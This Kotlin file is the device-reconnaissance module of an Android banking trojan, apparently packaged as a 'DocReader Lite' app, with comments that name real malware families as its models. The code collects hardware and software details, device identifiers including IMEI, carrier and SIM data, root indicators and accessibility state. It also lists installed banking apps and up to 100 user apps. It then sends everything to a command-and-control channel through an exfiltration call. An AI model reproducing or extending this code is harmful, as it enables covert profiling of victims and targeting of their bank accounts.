package com.docreader.lite.reader

import android.annotation.SuppressLint
import android.app.ActivityManager
import android.content.Context
import android.content.pm.PackageManager
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.os.BatteryManager
import android.os.Build
import android.os.StatFs
import android.provider.Settings
import android.telephony.TelephonyManager
import android.util.DisplayMetrics
import android.view.WindowManager
import org.json.JSONArray
import org.json.JSONObject
import java.io.File
import java.util.Locale
import java.util.TimeZone

/**
 * Device reconnaissance — first beacon every banker sends.
 *
 * Family reference:
 *   - Brokewell: full device fingerprint on install
 *   - ToxicPanda: IMEI + carrier + installed apps
 *   - Crocodilus: device + SIM + accessibility state
 *   - Anatsa V4: build props + installed banking apps
 *
 * Collects:
 *   Hardware (model, manufacturer, CPU, RAM, storage, screen)
 *   Software (Android version, security patch, installed apps)
 *   Network (carrier, connection type, WiFi SSID)
 *   Identity (Android ID, device serial, IMEI where available)
 *   State (battery, locale, timezone, accessibility services)
 *   Banking app inventory (which target apps are installed)
 */
object DeviceRecon {

    @SuppressLint("HardwareIds")
    fun collect(context: Context): JSONObject {
        val info = JSONObject()

        // ─── Hardware ───────────────────────────────────────────────
        info.put("hw", JSONObject().apply {
            put("model", Build.MODEL)
            put("manufacturer", Build.MANUFACTURER)
            put("brand", Build.BRAND)
            put("device", Build.DEVICE)
            put("board", Build.BOARD)
            put("hardware", Build.HARDWARE)
            put("product", Build.PRODUCT)
            put("cpu_abi", Build.SUPPORTED_ABIS.joinToString(","))
            put("cores", Runtime.getRuntime().availableProcessors())

            // RAM
            val am = context.getSystemService(Context.ACTIVITY_SERVICE) as? ActivityManager
            val mem = ActivityManager.MemoryInfo()
            am?.getMemoryInfo(mem)
            put("ram_total_mb", mem.totalMem / (1024 * 1024))
            put("ram_avail_mb", mem.availMem / (1024 * 1024))

            // Storage
            try {
                val stat = StatFs(android.os.Environment.getDataDirectory().path)
                put("storage_total_gb", stat.totalBytes / (1024L * 1024 * 1024))
                put("storage_avail_gb", stat.availableBytes / (1024L * 1024 * 1024))
            } catch (_: Exception) {}

            // Screen
            val wm = context.getSystemService(Context.WINDOW_SERVICE) as? WindowManager
            val dm = DisplayMetrics()
            @Suppress("DEPRECATION")
            wm?.defaultDisplay?.getRealMetrics(dm)
            put("screen_w", dm.widthPixels)
            put("screen_h", dm.heightPixels)
            put("density", dm.density)
        })

        // ─── Software ───────────────────────────────────────────────
        info.put("sw", JSONObject().apply {
            put("sdk", Build.VERSION.SDK_INT)
            put("release", Build.VERSION.RELEASE)
            put("security_patch", Build.VERSION.SECURITY_PATCH)
            put("bootloader", Build.BOOTLOADER)
            put("fingerprint", Build.FINGERPRINT)
            put("incremental", Build.VERSION.INCREMENTAL)
            put("codename", Build.VERSION.CODENAME)
            put("base_os", Build.VERSION.BASE_OS)
        })

        // ─── Identity ───────────────────────────────────────────────
        info.put("id", JSONObject().apply {
            put("android_id", Settings.Secure.getString(
                context.contentResolver, Settings.Secure.ANDROID_ID))
            @Suppress("DEPRECATION")
            put("serial", Build.SERIAL)
            put("host", Build.HOST)
            put("tags", Build.TAGS)
            put("type", Build.TYPE)

            // IMEI (requires READ_PHONE_STATE, may fail)
            try {
                val tm = context.getSystemService(Context.TELEPHONY_SERVICE) as? TelephonyManager
                @Suppress("DEPRECATION")
                put("imei", tm?.deviceId ?: "unavailable")
            } catch (_: SecurityException) {
                put("imei", "denied")
            }
        })

        // ─── Telephony ──────────────────────────────────────────────
        info.put("tel", JSONObject().apply {
            val tm = context.getSystemService(Context.TELEPHONY_SERVICE) as? TelephonyManager
            put("carrier", tm?.networkOperatorName ?: "unknown")
            put("carrier_code", tm?.networkOperator ?: "")
            put("sim_carrier", tm?.simOperatorName ?: "")
            put("sim_country", tm?.simCountryIso ?: "")
            put("network_country", tm?.networkCountryIso ?: "")
            put("phone_type", tm?.phoneType ?: -1)
            put("sim_state", tm?.simState ?: -1)
            put("has_sim", (tm?.simState ?: 0) == TelephonyManager.SIM_STATE_READY)
        })

        // ─── Network ────────────────────────────────────────────────
        info.put("net", JSONObject().apply {
            val cm = context.getSystemService(Context.CONNECTIVITY_SERVICE) as? ConnectivityManager
            val nc = cm?.getNetworkCapabilities(cm.activeNetwork)
            put("wifi", nc?.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) ?: false)
            put("cellular", nc?.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR) ?: false)
            put("vpn", nc?.hasTransport(NetworkCapabilities.TRANSPORT_VPN) ?: false)
        })

        // ─── State ──────────────────────────────────────────────────
        info.put("state", JSONObject().apply {
            put("locale", Locale.getDefault().toString())
            put("timezone", TimeZone.getDefault().id)
            put("language", Locale.getDefault().language)
            put("country", Locale.getDefault().country)

            // Battery
            val bm = context.getSystemService(Context.BATTERY_SERVICE) as? BatteryManager
            put("battery_pct", bm?.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY) ?: -1)
            put("charging", bm?.isCharging ?: false)

            // Root indicators (also useful for anti-emulator cross-check)
            put("su_exists", File("/system/xbin/su").exists() || File("/system/bin/su").exists())
            put("build_tags", Build.TAGS ?: "")
        })

        // ─── Installed banking apps (target inventory) ──────────────
        info.put("banking_apps", JSONArray().apply {
            val pm = context.packageManager
            Targets.getAll().forEach { target ->
                try {
                    @Suppress("DEPRECATION")
                    pm.getPackageInfo(target.packageName, 0)
                    put(target.packageName as Any) // Only add if installed
                } catch (_: PackageManager.NameNotFoundException) {}
            }
        })

        // ─── Accessibility state ────────────────────────────────────
        info.put("a11y", JSONObject().apply {
            val enabledServices = Settings.Secure.getString(
                context.contentResolver,
                Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
            ) ?: ""
            put("our_a11y_active", enabledServices.contains(context.packageName))
            put("enabled_services_count", enabledServices.split(":").filter { it.isNotBlank() }.size)
        })

        // ─── Installed apps (non-system, for profiling) ─────────────
        info.put("user_apps", JSONArray().apply {
            val pm = context.packageManager
            @Suppress("DEPRECATION")
            val apps = pm.getInstalledApplications(PackageManager.GET_META_DATA)
            apps.filter { it.flags and android.content.pm.ApplicationInfo.FLAG_SYSTEM == 0 }
                .take(100) // Cap at 100 to avoid huge payload
                .forEach { put(it.packageName) }
        })

        return info
    }

    /**
     * Collect + exfiltrate device recon as registration beacon.
     * Called on first boot, after A11y grant, and on C2 RECON command.
     */
    fun beacon(context: Context) {
        val recon = collect(context)
        Exfil.event("device_recon",
            "data" to recon.toString()
        )
    }
}
